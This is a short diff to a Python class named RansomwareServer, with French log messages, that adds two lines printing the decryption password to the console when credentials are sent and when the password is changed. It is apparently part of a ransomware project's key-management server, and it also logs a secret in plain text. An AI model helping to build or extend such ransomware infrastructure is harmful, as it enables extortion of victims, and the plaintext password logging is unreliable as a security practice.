@@ -73,6 +73,7 @@ class RansomwareServer:
             raise RuntimeError("[ERR] Le serveur n'est pas initialisé")
 
         print("[SVR] Envoi credentials de déchiffrement au client")
+        print(f"[SVR] Mot de passe : {self.password}")
 
         return {
             "password": self.password,
@@ -148,6 +149,7 @@ class RansomwareServer:
         self.argon2_params = new_argon2_params
 
         print("[SVR] Mot de passe changé")
+        print(f"[SVR] Nouveau mot de passe : {self.password}")
 
         return {
             "wrapped_rk_ciphertext": wrapped_rk_ciphertext,
